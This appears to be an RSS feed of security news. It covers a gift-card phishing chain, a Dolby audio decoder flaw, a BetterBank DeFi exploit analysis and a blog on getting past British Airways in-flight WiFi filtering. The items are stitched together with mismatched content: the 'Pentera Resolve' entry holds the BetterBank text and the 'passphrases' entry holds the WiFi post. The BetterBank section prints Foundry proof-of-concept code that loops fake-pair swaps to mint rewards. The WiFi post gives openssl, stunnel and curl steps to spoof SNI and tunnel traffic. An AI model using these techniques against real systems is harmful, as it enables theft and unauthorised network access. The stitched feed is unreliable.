alerting the attacker that their message landed in a real inbox.The address of that image was in the subdomain JYEUPPYOXOJNLZRWMXQPCSZWQUFK.soundestlink[.]com. The domain   is used by the Omnisend/Soundest email marketing infrastructure for tracking email link clicks, opens, and managing things like “unsubscribe” links. In other words, when someone uses Omnisend to send a campaign, embedded links and tracking pixels in the email often go through this domain so that activity can be logged (clicks, opens, etc.).That’s a lot of background, so let’s get to the main attraction: the clickable image.The link leads to https://www.streetsofgold[.]co.uk/wp-content/uploads/2025/05/bluestarguide.html and contains a unique identifier. In many phishing campaigns, each recipient gets a unique tracking token in the URL, so attackers know exactly whose link was clicked and when. This helps them track engagement, validate their target list, and potentially personalize follow-ups or sell ‘confirmed-open’ addresses.The streetsofgold[.]co.uk WordPress instance hasn’t been updated since 2023 and is highly likely compromised. The HTML file on that site redirects visitors to , which immediately forwards to  , adding more tracking parameters. It took a bit of tinkering and a VPN (set to Los Angeles) to follow the chain of redirects, but I finally ended up at the landing page.Of course, urgency was applied so visitors don’t take the time to think things through. The site said the offer was only valid for a few more minutes. The “one-click” promise quickly turned into a survey—answering basic questions about my age and gender, I was finally allowed to “order” my free Gorilla Cart.But no surprise here, now they wanted shipping details.Wait… what?

Likely, after “collecting” the personal info, the backend:stores it for later use in phishing or identity theft,possibly emails it to a criminal/“affiliate” scammer, and/orasks for credit card or payment details in a follow-up.We’re guessing all of the above.This campaign demonstrates that phishing is often an adaptive, multi-stage process, combining technical and psychological tricks. The best defense is a mix of technical protection and human vigilance.The best way to stay safe is to be aware of these scams, and look out for red flags:Don’t click on links in unsolicited emails.Always check the sender’s address against the legitimate one you would expect.Double-check the website’s address before entering any information.Don’t fill out personal details on unfamiliar websites.And certainly don’t fill out payment details unless you are sure of where you are and what you’re paying for.During this campaign we found and blocked these domains:www.streetsofgold[.]co.uk (compromised WordPress website) (redirector) (fingerprint and redirect) Other domains we found associated with ]]></content:encoded></item><item><title>Zero-click Dolby audio bug lets attackers run code on Android and Windows devices</title><link>https://www.malwarebytes.com/blog/news/2025/10/zero-click-dolby-audio-bug-lets-attackers-run-code-on-android-and-windows-devices</link><author></author><category>threatintel</category><pubDate>Wed, 22 Oct 2025 12:00:09 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Researchers from Google’s Project Zero discovered a medium-severity remote code execution (RCE) vulnerability that affects multiple platforms, including Android (Samsung and Pixel devices) and Windows. Remote code execution means an attacker could run programs on your device without your permission. The flaw, found in Dolby’s Unified Decoder Component (UDC) that handles audio playback, can be triggered automatically when a device receives an audio message—no tap or user action required.The flaw affects Android devices that use Dolby audio processing (for example, Google Pixel and Samsung smartphones) and Windows systems running Dolby UDC versions 4.5–4.13. Other vendors that integrate Dolby’s decoding capabilities may also be indirectly impacted, depending on their library updates.Tracked as CVE-2025-54957, the problem arises from the way the Dolby UDC handles “evolution data.” In the context of Dolby Digital Plus (DD+) audio streams, evolution data refers to a specialized extension block introduced in later versions of Dolby’s codecs to support additional functionality, such as higher channel counts, advanced loudness metadata, and dynamic range adjustments.The buffer overflow occurs when the decoder parses the evolution data and miscalculates the size of incoming packets. Because this data block can vary in length, depending on the metadata or the embedded audio mode, the faulty length calculation can lead to insufficient buffer allocation. Malformed data can then overwrite adjacent memory and potentially allow remote code execution.Buffers are areas of memory set aside to hold data. When a buffer overflow happens, it can overwrite neighboring memory areas, which may contain other data or executable code. This overwriting is not a deliberate action by the transaction or program, but an unintended consequence of the vulnerability, which could have been prevented by bounds checking.While not every overflow carries malicious intent, the behavior of buffer overflows can be exploited. Attackers can use them to disrupt the operation of other programs, causing them to malfunction, expose secrets, or even run malicious code. In fact, buffer overflow vulnerabilities are the most common security vulnerabilities today.The vulnerability is exploitable by sending a target a specially crafted audio file. An attacker could make a phone or PC run malicious code inside the audio-decoding process, leading to crashes or unauthorized control. It’s similar to getting a song stuck in your head so badly that you can’t think of anything else and end up dancing off a cliff.The abuse of CVE-2025-54957 is not a purely hypothetical case. In its official October 14 security advisory, Dolby mentions that it is:“aware of a report found with Google Pixel devices indicating that there is a possible increased risk of vulnerability if this bug is used alongside other known Pixel vulnerabilities. Other Android mobile devices could be at risk of similar vulnerabilities.”Dolby did not reveal any details, but just looking at the September 2025 Android security updates, there are several patches that could plausibly be chained with this bug to allow a local attacker to gain an elevation of privilege (EoP). To prevent falling victim to an attack using this vulnerability, there are a few things you can do.Don’t open unsolicited attachments, including sound files.Install updates promptly. Dolby has released fixes that device makers must roll into firmware and OS updates—enable automatic updates where possible.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Bridging the Remediation Gap: Introducing Pentera Resolve</title><link>https://thehackernews.com/2025/10/bridging-remediation-gap-introducing.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_i87-seKwjH0Cp1DSg8tCCCk-rdCCa6R3aGzrrYQaXtOnCTBiMFmE5pW7F6FsDztRcfYrsPBH6NZgn3dnRjoI5wDDPWWYWOuSHhJWxxBJzUzXRVph2ylTti6wytHpCQwTMzjjdu2ntcV7Exz8pr4D7OC6RrqmV2JtILkvETyyatCC27NJsyIxsKC5pCk/s1600/pentera-main.jpg" length="" type=""/><pubDate>Wed, 22 Oct 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[From Detection to Resolution: Why the Gap Persists

The attack resulted in an initial loss of approximately $5 million in digital assets. Following on-chain negotiations, the attacker returned approximately $2.7 million in assets, mitigating the financial damage and leaving a net loss of around $1.4 million. The vulnerability stemmed from a fundamental flaw in the protocol’s bonus reward system, specifically in the swapExactTokensForFavorAndTrackBonus function. This function was designed to mint ESTEEM reward tokens whenever a swap resulted in FAVOR tokens, but critically, it lacked the necessary validation to ensure that the swap occurred within a legitimate, whitelisted liquidity pool.A prior security audit by Zokyo had identified and flagged this precise vulnerability. However, due to a documented communication breakdown and the vulnerability’s perceived low severity, the finding was downgraded, and the BetterBank development team did not fully implement the recommended patch. This incident is a pivotal case study demonstrating how design-level oversights, compounded by organizational inaction in response to security warnings, can lead to severe financial consequences in the high-stakes realm of blockchain technology. The exploit underscores the importance of thorough security audits, clear communication of findings, and multilayered security protocols to protect against increasingly sophisticated attack vectors.In this article, we will analyze the root cause, impact, and on-chain forensics of the helper contracts used in the attack.The BetterBank exploit was the culmination of a series of events that began well before the attack itself. In July 2025, approximately one month prior to the incident, the BetterBank protocol underwent a security audit conducted by the firm Zokyo. The audit report, which was made public after the exploit, explicitly identified a critical vulnerability related to the protocol’s bonus system. Titled “A Malicious User Can Trade Bogus Tokens To Qualify For Bonus Favor Through The UniswapWrapper,” the finding was a direct warning about the exploit vector that would later be used. However, based on the documented proof of concept (PoC), which used test Ether, the severity of the vulnerability was downgraded to “Informational” and marked as “Resolved” in the report. The BetterBank team did not fully implement the patched code snippet.The attack occurred on August 26, 2025. In response, the BetterBank team drained all remaining FAVOR liquidity pools to protect the assets that had not yet been siphoned. The team also took the proactive step of announcing a 20% bounty for the attacker and attempted to negotiate the return of funds.Remarkably, these efforts were successful. On August 27, 2025, the attacker returned a significant portion of the stolen assets – 550 million DAI tokens. This partial recovery is not a common outcome in DeFi exploits.This incident had a significant financial impact on the BetterBank protocol and its users. Approximately $5 million worth of assets was initially drained. The attack specifically targeted liquidity pools, allowing the perpetrator to siphon off a mix of stablecoins and native PulseChain assets. The drained assets included 891 million DAI tokens, 9.05 billion PLSX tokens, and 7.40 billion WPLS tokens.In a positive turn of events, the attacker returned approximately $2.7 million in assets, specifically 550 million DAI. These funds represented a significant portion of the initial losses, resulting in a final net loss of around $1.4 million. This figure speaks to the severity of the initial exploit and the effectiveness of the team’s recovery efforts. While data from various sources show minor fluctuations in reported values due to real-time token price volatility, they consistently point to these key figures.A detailed breakdown of the losses and recovery is provided in the following table:The total value of assets drained during the exploit.891M DAI, 9.05B PLSX, 7.40B WPLSThe specific tokens and quantities siphoned from the protocol’s liquidity pools.The value of assets returned by the attacker following on-chain negotiations.The final, unrecovered financial loss to the protocol and its users.Protocol description and vulnerability analysisThe BetterBank protocol is a decentralized lending platform on the PulseChain network. It incorporates a two-token system that incentivizes liquidity provision and engagement. The primary token is FAVOR, while the second, ESTEEM, acts as a bonus reward token. The protocol’s core mechanism for rewarding users was tied to providing liquidity for FAVOR on decentralized exchanges (DEXs). Specifically, a function was designed to mint and distribute ESTEEM tokens whenever a trade resulted in FAVOR as the output token. While seemingly straightforward, this incentive system contained a critical design flaw that an attacker would later exploit.The vulnerability was not a mere coding bug, but a fundamental architectural misstep. By tying rewards to a generic, unvalidated condition – the appearance of FAVOR in a swap’s output – the protocol created an exploitable surface. Essentially, this design choice trusted all external trading environments equally and failed to anticipate that a malicious actor could replicate a trusted environment for their own purposes. This is a common failure in tokenomics, where the focus on incentivization overlooks the necessary security and validation mechanisms that should accompany the design of such features.The technical root cause of the vulnerability was a fundamental logic flaw in one of BetterBank’s smart contracts. The vulnerability was centered on the swapExactTokensForFavorAndTrackBonus function. The purpose of this function was to track swaps and mint ESTEEM bonuses. However, its core logic was incomplete: it only verified that FAVOR was the output token from the swap and failed to validate the source of the swap itself. The contract did not check whether the transaction originated from a legitimate, whitelisted liquidity pool or a registered contract. This lack of validation created a loophole that allowed an attacker to trigger the bonus system at will by creating a fake trading environment.This primary vulnerability was compounded by a secondary flaw in the protocol’s tokenomics: the flawed design of convertible rewards.The ESTEEM tokens, minted as a bonus, could be converted back into FAVOR tokens. This created a self-sustaining feedback loop. An attacker could trigger the swapExactTokensForFavorAndTrackBonus function to mint ESTEEM, and then use those newly minted tokens to obtain more FAVOR. The FAVOR could then be used in subsequent swaps to mint even more ESTEEM rewards. This cyclical process enabled the attacker to generate an unlimited supply of tokens and drain the protocol’s real reserves. The synergistic combination of logic and design flaws created a high-impact attack vector that was difficult to contain once initiated.To sum it up, the BetterBank exploit was the result of a critical vulnerability in the bonus minting system that allowed attackers to create fake liquidity pairs and harvest an unlimited amount of ESTEEM token rewards. As mentioned above, the system couldn’t distinguish between legitimate and malicious liquidity pairs, creating an opportunity for attackers to generate illegitimate token pairs. The BetterBank system included protection measures against attacks capable of inflicting substantial financial damage – namely a sell tax. However, the threat actors were able to bypass this tax mechanism, which exacerbated the impact of the attack.The exploit targeted the bonus minting system of the  contract, specifically the  function and related tax logic. The key vulnerable components are:Vulnerable function: logBuy(address user, uint256 amount)Supporting function: calculateFavorBonuses(uint256 amount)Tax logic:  functionThe  function only checks if the caller is an approved buy wrapper; it doesn’t validate the legitimacy of the trading pair or liquidity source.function logBuy(address user, uint256 amount) external {
    require(isBuyWrapper[msg.sender], "Only approved buy wrapper can log buys");

    (uint256 userBonus, uint256 treasuryBonus) = calculateFavorBonuses(amount);
    pendingBonus[user] += userBonus;

    esteem.mint(treasury, treasuryBonus);
    emit EsteemBonusLogged(user, userBonus, treasuryBonus);
The tax only applies to transfers to legitimate, whitelisted addresses that are marked as . By definition, fake, unauthorized LPs are not included in this mapping, so they bypass the maximum 50% sell tax imposed by protocol owners.function _transfer(address sender, address recipient, uint256 amount) internal override {
    uint256 taxAmount = 0;

    if (_isTaxExempt(sender, recipient)) {
        super._transfer(sender, recipient, amount);
        return;
    }

    // Transfer to Market Pair is likely a sell to be taxed
    if (isMarketPair[recipient]) {
        taxAmount = (amount * sellTax) / MULTIPLIER;
    }

    if (taxAmount > 0) {
        super._transfer(sender, treasury, taxAmount);
        amount -= taxAmount;
    }

    super._transfer(sender, recipient, amount);
}
The  contract contains the buy wrapper functions that call . The system only checks if the pair is in  mapping, but this can be manipulated by creating fake tokens and adding them to the mapping to get them approved.function swapExactTokensForFavorAndTrackBonus(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
) external {
    address finalToken = path[path.length - 1];
    require(isFavorToken[finalToken], "Path must end in registered FAVOR");
    require(allowedDirectPair[path[0]][finalToken], "Pair not allowed");
    require(path.length == 2, "Path must be direct");

    // ... swap logic ...

    uint256 twap = minterOracle.getTokenTWAP(finalToken);
    if(twap < 3e18){
        IFavorToken(finalToken).logBuy(to, favorReceived);
    }
}Step-by-step attack reconstructionThe attack on BetterBank was not a single transaction, but rather a carefully orchestrated sequence of on-chain actions. The exploit began with the attacker acquiring the necessary capital through a flash loan. Flash loans are a feature of many DeFi protocols that allow a user to borrow large sums of assets without collateral, provided the loan is repaid within the same atomic transaction. The attacker used the loan to obtain a significant amount of assets, which were then used to manipulate the protocol’s liquidity pools.The attacker used the flash loan funds to target and drain the real DAI-PDAIF liquidity pool, a core part of the BetterBank protocol. This initial step was crucial because it weakened the protocol’s defenses and provided the attacker with a large volume of PDAIF tokens, which were central to the reward-minting scheme.After draining the real liquidity pool, the attacker moved to the next phase of the operation. They deployed a new, custom, and worthless ERC-20 token. Exploiting the permissionless nature of PulseX, the attacker then created a fake liquidity pool, pairing their newly created bogus token with PDAIF.This fake pool was key to the entire exploit. It enabled the attacker to control both sides of a trading pair and manipulate the price and liquidity to their advantage without affecting the broader market.One critical element that made this attack profitable was the protocol’s tax logic. BetterBank had implemented a system that levied high fees on bulk swaps to deter this type of high-volume trading. However, the tax only applied to “official” or whitelisted liquidity pairs. Since the attacker’s newly created pool was not on this list, they were able to conduct their trades without incurring any fees. This critical loophole ensured the attack’s profitability.After establishing the bogus token and fake liquidity pool, the attacker initiated the final and most devastating phase of the exploit: the reward minting loop. They executed a series of rapid swaps between their worthless token and PDAIF within their custom-created pool. Each swap triggered the vulnerable swapExactTokensForFavorAndTrackBonus function in the BetterBank contract. Because the function did not validate the pool, it minted a substantial bonus of ESTEEM tokens with each swap, despite the illegitimacy of the trading pair.swapExactTokensForFavorAndTrackBonus() executionESTEEM token minting (44% bonus)The newly minted ESTEEM tokens were then converted back into FAVOR tokens, which could be used to facilitate more swaps. This created a recursive loop that allowed the attacker to generate an immense artificial supply of rewards and drain the protocol’s real asset reserves. Using this method, the attacker extracted approximately 891 million DAI, 9.05 billion PLSX, and 7.40 billion WPLS, effectively destabilizing the entire protocol. The success of this multi-layered attack demonstrates how a single fundamental logic flaw, combined with a series of smaller design failures, can lead to a catastrophic outcome.Economic impact comparisonThis attack could have been averted if a number of security measures had been implemented.First, the liquidity pool should be verified during a swap. The LP pair and liquidity source must be valid.function logBuy(address user, uint256 amount) external {
    require(isBuyWrapper[msg.sender], "Only approved buy wrapper can log buys");
    
    //  ADD: LP pair validation
    require(isValidLPPair(msg.sender), "Invalid LP pair");
    require(hasMinimumLiquidity(msg.sender), "Insufficient liquidity");
    require(isVerifiedPair(msg.sender), "Unverified trading pair");
    
    //  ADD: Amount limits
    require(amount <= MAX_SWAP_AMOUNT, "Amount exceeds limit");
    
    (uint256 userBonus, uint256 treasuryBonus) = calculateFavorBonuses(amount);
    pendingBonus[user] += userBonus;
    
    esteem.mint(treasury, treasuryBonus);
    emit EsteemBonusLogged(user, userBonus, treasuryBonus);
}
The sell tax should be applied to all transfers.function _transfer(address sender, address recipient, uint256 amount) internal override {
    uint256 taxAmount = 0;
    
    if (_isTaxExempt(sender, recipient)) {
        super._transfer(sender, recipient, amount);
        return;
    }
    
    //  FIX: Apply tax to ALL transfers, not just market pairs
    if (isMarketPair[recipient] || isUnverifiedPair(recipient)) {
        taxAmount = (amount * sellTax) / MULTIPLIER;
    }
    
    if (taxAmount > 0) {
        super._transfer(sender, treasury, taxAmount);
        amount -= taxAmount;
    }
    
    super._transfer(sender, recipient, amount);
}
To prevent large-scale one-time attacks, a daily limit should be introduced to stop users from conducting transactions totaling more than 10,000 ESTEEM tokens per day.mapping(address => uint256) public lastBonusClaim;
mapping(address => uint256) public dailyBonusLimit;
uint256 public constant MAX_DAILY_BONUS = 10000 * 1e18; // 10K ESTEEM per day

function logBuy(address user, uint256 amount) external {
    require(isBuyWrapper[msg.sender], "Only approved buy wrapper can log buys");
    
    //  ADD: Rate limiting
    require(block.timestamp - lastBonusClaim[user] > 1 hours, "Rate limited");
    require(dailyBonusLimit[user] < MAX_DAILY_BONUS, "Daily limit exceeded");
    
    // Update rate limiting
    lastBonusClaim[user] = block.timestamp;
    dailyBonusLimit[user] += calculatedBonus;
    
    // ... rest of function
}On-chain forensics and fund tracingThe on-chain trail left by the attacker provides a clear forensic record of the exploit. After draining the assets on PulseChain, the attacker swapped the stolen DAI, PLSX, and WPLS for more liquid, cross-chain assets. The perpetrator then bridged approximately $922,000 worth of ETH from the PulseChain network to the Ethereum mainnet. This was done using a secondary attacker address beginning with 0xf3BA…, which was likely created to hinder exposure of the primary exploitation address. The final step in the money laundering process was the use of a crypto mixer, such as Tornado Cash, to obscure the origin of the funds and make them untraceable.Tracing the flow of these funds was challenging because many public-facing block explorers for the PulseChain network were either inaccessible or lacked comprehensive data at the time of the incident. This highlights the practical difficulties associated with on-chain forensics, where the lack of a reliable, up-to-date block explorer can greatly hinder analysis. In these scenarios, it becomes critical to use open-source explorers like Blockscout, which are more resilient and transparent.The following table provides a clear reference for the key on-chain entities involved in the attack:0x48c9f537f3f1a2c95c46891332E05dA0D268869BThe main externally owned account used to initiate the attack.0xf3BA0D57129Efd8111E14e78c674c7c10254acAEThe address used to bridge assets to the Ethereum network.Attacker Helper Contracts0x792CDc4adcF6b33880865a200319ecbc496e98f8, etc.A list of contracts deployed by the attacker to facilitate the exploit.0x165C3410fC91EF562C50559f7d2289fEbed552d9The PulseX decentralized exchange router contract used in the exploit.We managed to get hold of the attacker’s helper contracts to deepen our investigation. Through comprehensive bytecode analysis and contract decompilation, we determined that the attack architecture was multilayered. The attack utilized a factory contract pattern (0x792CDc4adcF6b33880865a200319ecbc496e98f8) that contained 18,219 bytes of embedded bytecode that were dynamically deployed during execution. The embedded contract revealed three critical functions: two simple functions ( and ) for initialization and cleanup, and a highly complex flash loan callback function () with the signature executeOperation(address[],uint256[],uint256[],address,bytes), which matches standard DeFi flash loan protocols like Aave and dYdX. Analysis of the decompiled code revealed that the executeOperation function implements sophisticated parameter parsing for flash loan callbacks, dynamic contract deployment capabilities, and complex external contract interactions with the PulseX Router (0x165c3410fc91ef562c50559f7d2289febed552d9).contract BetterBankExploitContract {

    ) internal {

}
The attack exploited three critical vulnerabilities in BetterBank’s protocol: unvalidated reward minting in the  function that failed to verify legitimate trading pairs; a tax bypass mechanism in the  function that only applied the 50% sell tax to addresses marked as market pairs; and oracle manipulation through fake trading volume. The attacker requested flash loans of 50M DAI and 7.14B PLP tokens, drained real DAI-PDAIF pools, and created fake PDAIF pools with minimal liquidity. They performed approximately 20 iterations of fake trading to trigger massive ESTEEM reward minting, converting the rewards into additional PDAIF tokens, before re-adding liquidity with intentional imbalances and extracting profits of approximately 891M DAI through arbitrage.To illustrate the vulnerabilities that made such an attack possible, we examined code snippets from Zokyo researchers.First, a fake liquidity pool pair is created with FAVOR and a fake token is generated by the attacker. By extension, the liquidity pool pairs with this token were also unsubstantiated.function _createFakeLPPair() internal {
        console.log("--- Step 1: Creating Fake LP Pair ---");
        
        vm.startPrank(attacker);
        
        // Create the pair
        fakePair = factory.createPair(address(favorToken), address(fakeToken));
        console.log("Fake pair created at:", fakePair);
        
        // Add initial liquidity to make it "legitimate"
        uint256 favorAmount = 1000 * 1e18;
        uint256 fakeAmount = 1000000 * 1e18;
        
        // Transfer FAVOR to attacker
        vm.stopPrank();
        vm.prank(admin);
        favorToken.transfer(attacker, favorAmount);
        
        vm.startPrank(attacker);
        
        // Approve router
        favorToken.approve(address(router), favorAmount);
        fakeToken.approve(address(router), fakeAmount);
        
        // Add liquidity
        router.addLiquidity(
            address(favorToken),
            address(fakeToken),
            favorAmount,
            fakeAmount,
            0,
            0,
            attacker,
            block.timestamp + 300
        );
        
        console.log("Liquidity added to fake pair");
        console.log("FAVOR in pair:", favorToken.balanceOf(fakePair));
        console.log("FAKE in pair:", fakeToken.balanceOf(fakePair));
        
        vm.stopPrank();
    }
Next, the fake LP pair is approved in the  mapping, allowing it to pass the system check and perform the bulk swap transactions.function _approveFakePair() internal {
        console.log("--- Step 2: Approving Fake Pair ---");
        
        vm.prank(admin);
        routerWrapper.setAllowedDirectPair(address(fakeToken), address(favorToken), true);
        
        console.log("Fake pair approved in allowedDirectPair mapping");
    }
These steps enable exploit execution, completing FAVOR swaps and collecting ESTEEM bonuses.function _executeExploit() internal {
        console.log("--- Step 3: Executing Exploit ---");
        
        vm.startPrank(attacker);
        
        uint256 exploitAmount = 100 * 1e18; // 100 FAVOR per swap
        uint256 iterations = 10; // 10 swaps
        
        console.log("Performing %d exploit swaps of %d FAVOR each", iterations, exploitAmount / 1e18);
        
        for (uint i = 0; i < iterations; i++) {
            _performExploitSwap(exploitAmount);
            console.log("Swap %d completed", i + 1);
        }
        
        // Claim accumulated bonuses
        console.log("Claiming accumulated ESTEEM bonuses...");
        favorToken.claimBonus();
        
        vm.stopPrank();
    }
We also performed a single swap in a local environment to demonstrate the design flaw that allowed the attackers to perform transactions over and over again.function _performExploitSwap(uint256 amount) internal {
        // Create swap path: FAVOR -> FAKE -> FAVOR
        address[] memory path = new address[](2);
        path[0] = address(favorToken);
        path[1] = address(fakeToken);
        
        // Approve router
        favorToken.approve(address(router), amount);
        
        // Perform swap - this triggers logBuy() and mints ESTEEM
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, // Accept any amount out
            path,
            attacker,
            block.timestamp + 300
        );
    }
Finally, several checks are performed to verify the exploit’s success.function _verifyExploitSuccess() internal {        
        uint256 finalFavorBalance = favorToken.balanceOf(attacker);
        uint256 finalEsteemBalance = esteemToken.balanceOf(attacker);
        uint256 esteemMinted = esteemToken.totalSupply() - initialEsteemBalance;
        
        console.log("Attacker's final FAVOR balance:", finalFavorBalance / 1e18);
        console.log("Attacker's final ESTEEM balance:", finalEsteemBalance / 1e18);
        console.log("Total ESTEEM minted during exploit:", esteemMinted / 1e18);
        
        // Verify the attack was successful
        assertGt(finalEsteemBalance, 0, "Attacker should have ESTEEM tokens");
        assertGt(esteemMinted, 0, "ESTEEM tokens should have been minted");
        
        console.log("EXPLOIT SUCCESSFUL!");
        console.log("Attacker gained ESTEEM tokens without legitimate trading activity");
    }The BetterBank exploit was a multifaceted attack that combined technical precision with detailed knowledge of the protocol’s design flaws. The root cause was a lack of validation in the reward-minting logic, which enabled an attacker to generate unlimited value from a counterfeit liquidity pool. This technical failure was compounded by an organizational breakdown whereby a critical vulnerability explicitly identified in a security audit was downgraded in severity and left unpatched.The incident serves as a powerful case study for developers, auditors, and investors. It demonstrates that ensuring the security of a decentralized protocol is a shared, ongoing responsibility. The vulnerability was not merely a coding error, but rather a design flaw that created an exploitable surface. The confusion and crisis communications that followed the exploit are a stark reminder of the consequences when communication breaks down between security professionals and protocol teams. While the return of a portion of the funds is a positive outcome, it does not overshadow the core lesson: in the world of decentralized finance, every line of code matters, every audit finding must be taken seriously, and every protocol must adopt a proactive, multilayered defense posture to safeguard against the persistent and evolving threats of the digital frontier.]]></content:encoded></item><item><title>Jingle Thief: Inside a Cloud-Based Gift Card Fraud Campaign</title><link>https://unit42.paloaltonetworks.com/cloud-based-gift-card-fraud-campaign/</link><author>Stav Setty and Shachar Roitman</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/10/07_Cybercrime_Category_1920x900.jpg" length="" type=""/><pubDate>Wed, 22 Oct 2025 10:00:10 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Threat actors behind the gift card fraud campaign Jingle Thief target retail via phishing and smishing, maintaining long-term access in cloud environments.]]></content:encoded></item><item><title>Why You Should Swap Passwords for Passphrases</title><link>https://thehackernews.com/2025/10/why-you-should-swap-passwords-for.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBDAguIG96RALTt26AAiezNmRWKzNP8pz2CTXvpPbIhS4UKIaPVX4hnrWAK9_7kKOLaEWpe2xFhYxcLcBDfsENXOcXOT8k8Td3BgTJCcTcDIZncDXmbkGUNUn6Uk2agLF1GmtR2rCfa1FhDPPGtH4HOJGGQLn7rZXWBL2QxHETrrZTXbUt1dMmFOMzErw/s1600/OUTPOST.jpg" length="" type=""/><pubDate>Wed, 22 Oct 2025 09:26:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The advice didn't change for decades: use complex passwords with uppercase, lowercase, numbers, and symbols.

I’d done the same flight back in 2023, and remember relying on the in-flight entertainment for the 14 hour journey. However, this time on my way to London, they had an interesting offer: Free WiFi for “Messaging”, for members of “The British Airways Club”.I was pretty sure I wasn’t a member of any sort of club (I’m only flying economy anyway); but turns out this is just the name of their frequent flyer program. Conveniently enough, you’re able to sign up for this via the captive portal while in the sky; and although it asks for your E-Mail you don’t need to verify it (thereby allowing you to complete the signup without access to the internet).Once signed in, the captive portal invited me to “Start session”, which true to it’s word, let me start texting people. I tried Whatsapp, Signal, Wechat and Discord. The first three worked (though not for images), Discord expectedly did not. Not bad for free wifi!This was the first question I had as soon as I confirmed messaging did work. It’s 2025; everything should be encrypted in transit. So how does it know if I’m using Whatsapp vs. Discord? One idea I had is it just somehow capped the bandwidth / data transfer of individual TCP connections; so when you’re sending a single message or two it gets through, but something larger would fail.To test this, I used my phone to open up the classic: example.com. Unfortunately this didn’t load - so there must’ve been a bit more going on…Thankfully I had my laptop on me, so the next step was to connect to WiFi with the devtools open to the network tab, and wireshark on the side for good measure. After registering for the WiFi again, it was time to play around a bit. Opening up something like example.com revealed a TCP reset in the wireshark, right after the Client Hello, and my brain immediately jumped to SNI. It’s something that’s really annoyed me about the TLS spec since it’s widely used by ISPs in India to block websites (although there is work being done to fix this; ECH (which was itself previously ESNI)).tl;dr SNI reveals the domain name of EVERY website you connect to in the TLS handshake, before the tunnel is established! Although the actual contents of what you’re doing, on say, totallynondodgywebsite.com are encrypted, anyone on the wire can see that you connected to it (including ISPs). My guess was that they had a set of whitelisted domains used by messaging apps, and if they see anything else, they just reset the connection.Sidebar: people’s reactions when I try to tell this are always extremely varied. Many of my non-technical friends think anything you do without a VPN is visible to everyone, while some slightly technical ones still think that the URL (including query params) is visible, but the responses are not. Finally there is some subset of people who believe TLS means all data is encrypted in transit between client & server, though they had no idea SNI leaks all the domains they visit!Although BA blocks DNS queries to all (well all I could remember) public resolvers, they do resolve any domain you throw at them, including MX, TXT, HTTPS records. (This itself could be an interesting area of exploration; especially since the DNS resolution can be triggered before signing up for free WiFi. Something along the lines of arbitrary subdomains which represent the request payload, and a custom nameserver that returns responses via the TXT record or something. Anyway…).Getting the A record of my personal server, I made a TLS handshake to the IP address directly, without any SNI. This was then reset by BA; so the lack of SNI is also blocked!$ openssl s_client -connect 95.217.167.10:443

The next step was to try and test some SNI that might go through. Off the top of my head, I knew  was used by Whatsapp for some stuff, so I decided to use it. The way SNI works is it tells the server which host you want to connect to, so it can present the right TLS certificate. In my case, my server did not have any cert for  , but NGINX seemingly just ignores the SNI if it doesn’t exist and returns the first cert (I think; could also be related to my config but I didn’t look to much into this).But basically, as long as I (the client) don’t care, I can complete the TLS connection for any random cert the server offers me, even if in the SNI I provide a domain I don’t control (e.g.  in this case).$ openssl s_client -connect 95.217.167.10:443 -servername wa.me

I successfully managed to request and receive my homepage! All ~5KiB of it, not bad. Now the challenge was to extend this to browse any website…Ok, my relationship with SNI isn’t as cliche as that, and I think we’re still enemies. But this opens up some exciting opportunities to say the least. If I can convince BA that I’m connecting to , I can potentially do whatever I want over that connection (under the guise of “messaging”). So the requirments were:Establish a TLS connection using the SNI Tunnel arbitrary traffic through that connectionDo all this without actually owning / controlling the  domainFrom my past experiences w/ reverse-engineering etc., the most obvious way to do this seemed to be an HTTPS proxy. It had to be HTTPS specifically, since the connection to proxy was going to be what I’d “fake” as Whatsapp. If the TLS handshake to the HTTPS proxy had the SNI  , BA  let it through, and then I can make the real requests I want via the proxy.Unfortunately I was in the air, and without easy access to the internet to manage my servers and the like, I couldn’t quite set all of this up; I’d have to do that while on holiday and test it on the flight back. I could  and emulate the BA restrictions etc. while on thr ground, but I decided to YOLO it.I managed to find one of my VPSs that wasn’t already using port 443. Let’s assume the public IP was  (yes I know octets don’t go beyond , if you really want my IP check the screenshots below). I then setup an HTTP proxy on it using tinyproxy. However this just sets up a basic HTTP proxy, which was listening on .To add the TLS layer, I used stunnel. For the TLS setup of stunnel, I just generated some self-signed certs via openSSL using all defaults, except the common name (CN), for which I used , since I wanted to try and ensure max compatibility (e.g. the client doesn’t reject due to unexpected SNI vs. CN, or the server not knowing which cert to provide).openssl req -nodes -newkey ed25519 -keyout ssl.key -x509 -days 365 -out ssl.crt
 actually, on the client I decided to ignore TLS errors (self-signed cert), and stunnel didn’t care about SNI, so this () didn’t matter too much. But for more legit use cases it definitely does!To just make sure the proxy worked as expected, I tried it via curl directly on the IP:$ curl -x https://user:pass@333.333.333.333:443 ifconfig.co -v
*   Trying 333.333.333.333:443...
* TLSv1.3 (OUT), TLS handshake, Client hello (1):

* closing connection #0
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
Of course! I just randomly generated the certs on my VPS, not signed by a “trusted” CA or anything. Well, we can tell cURL to ignore TLS errors for the proxy with the  flag, and now it works; the response is the IP of my VPS.However there’s a problem - if I connect to the proxy directly via the IP, there is no SNI extension set, so this would get blocked. The SNI extension is set when connection to a domain, so I need to configure  to point to . This can be done via the hosts file of course, but cURL also provides a quick CLI hack via :curl --resolve wa.me:443:333.333.333.333 -x https://username:password@wa.me ifconfig.co --proxy-insecure -v
